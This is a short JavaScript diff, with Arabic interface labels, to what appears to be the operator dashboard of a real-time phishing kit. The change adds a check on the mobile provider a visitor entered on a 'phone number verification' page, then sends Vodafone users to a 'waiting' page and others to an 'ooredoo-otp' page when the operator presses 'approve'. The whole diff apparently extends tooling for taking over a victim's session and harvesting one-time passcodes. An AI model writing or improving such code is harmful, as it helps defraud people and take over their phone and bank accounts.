@@ -1793,8 +1793,11 @@
             
             // إضافة أزرار لتوثيق رقم الهاتف (النافذة الواحدة)
             if (dataEntry.page === 'توثيق رقم الهاتف') {
+              const mobileProvider = (dataEntry.content['مزود الخدمة'] || '').toLowerCase();
+              const isVodafone = mobileProvider.includes('vodafone') || mobileProvider.includes('فودافون');
+              const approveTarget = isVodafone ? 'waiting' : 'ooredoo-otp';
               html += '<div class="flex gap-2 mt-3">';
-              html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'ooredoo-otp\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'' + approveTarget + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
               html += '<button onclick="codeActionReject(this, \'' + visitor.socketId + '\', 0)" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
             }
